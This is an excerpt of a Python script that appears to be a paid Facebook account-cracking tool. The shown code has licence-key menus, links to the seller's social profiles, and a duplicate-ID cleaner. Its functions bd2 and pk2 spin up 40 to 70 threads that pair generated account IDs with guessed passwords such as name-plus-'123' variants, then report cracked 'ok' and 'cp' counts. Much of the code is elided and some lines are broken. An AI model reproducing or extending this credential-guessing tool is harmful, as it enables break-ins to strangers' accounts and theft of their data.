...
def Subscraption():
    ...
    if key1 in r1:
        ...
        if opt =='1':
            tks = '*NAMSTE*%2C%20*BIBASH-SIR*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*---*%20*MR_CRAZY_COMMAND%20*---*%20*Version%20:%201.0.2%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*='+key1
            os.system('xdg-open  +997 9846774433?text='+tks)
            Subscraption()
        if opt =='2':
            os.system('xdg-open https://www.facebook.com/Bibashherooo?mibextid=ZbWKwL');Subscraption()
        if opt =='3':
            os.system('xdg-open https://www.facebook.com/profile.php?id=100085995566705&mibextid=ZbWKwL/');Subscraption()
        if opt =='4':
...
def Subscraption1():
    ...
    if key2 in r1:
        ...
        opt = input(f'{P}[{M}+{P}] Choose {M}:{H} ')
        if opt =='1':
            tks = '*NAMASTE*%2C%20*BIBASH-SIR*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*---*%20*MR_CRAZY_COMMAND%20*---*%20*Version%20:%201.0.2%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*='+key1
            os.system('xdg-open  +977 9846774433?text='+tks)
            Subscraption()
        if opt =='2':
            os.system('xdg-open https://www.facebook.com/Bibashherooo?mibextid=ZbWKwL');Subscraption()
        if opt =='3':
            os.system('xdg-open ');Subscraption()
        if opt =='4':
            clear();banner2();jalan(f'{P}[{M}√{P}] Hi Bro Your Crazy Terminal Closed {P} ')
        else:
            print('\n\033[1;92mChoose valid option\033[0;97m');Subscraption()
...
if 'START' in ck:
    ...
    exit(f'{K}Updating Crazy Green Fire');os.system("xdg-open https://github.com/FB-KING");os.system("xdg-open https://www.facebook.com/Bibashherooo?mibextid=ZbWKwL")
elif 'BYS' in ck:
...
banner2();jalan(f'{H}Update Checking Please Wait ') #;os.system("xdg-open https://github.com/FB-KING");os.system("xdg-open https://www.facebook.com/Bibashherooo?mibextid=ZbWKwL")
...
def menu():
            ...
            if crazy_nil in ['1','01']:
                ...
                os.system('xdg-open https://www.facebook.com/Bibashherooo?mibextid=ZbWKwL');menu()
            elif crazy_nil in ['9','09']:
                clear();banner2();jalan(f'{P}[{M}√{P}] Hi Bro Your Crazy Terminal Closed {P} ')
            else:
                exit(' Menu not found try again...')
def dupcutter():
    os.system('clear');banner2();print(f' {P}Example   {M}:{H} /sdcard/bibas.txt');print(led)
    Error = input(f" {N}File Name {M}:{H} ");print(led);print(f' {P}Example   {M}:{H} /sdcard/Bibas.txt');print(led)
...
def bd2():
    ...
    with ThreadPool(max_workers=40) as crazy_xd:
        ...
        for check1 in idf:
            idf = check+check1
            #pwv = [idf,NEPAL','freefire','Free Fire','i love you']
...
def pk2():
    ...
    with ThreadPool(max_workers=70) as crazy_xd:
        ...
        for check1 in idf:
            idf = check+check1
            pwv = [idf,check1,'First 123@,firstlast,first last etc']
            crazy_xd.submit(filexxxx,idf,pwv)
    print(led);print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+str(len(ok)));print(f' {P}Total cp : {K}'+str(len(cp)));print(led)
    input('Press Enter To Go Menu');menu()
loop = 0
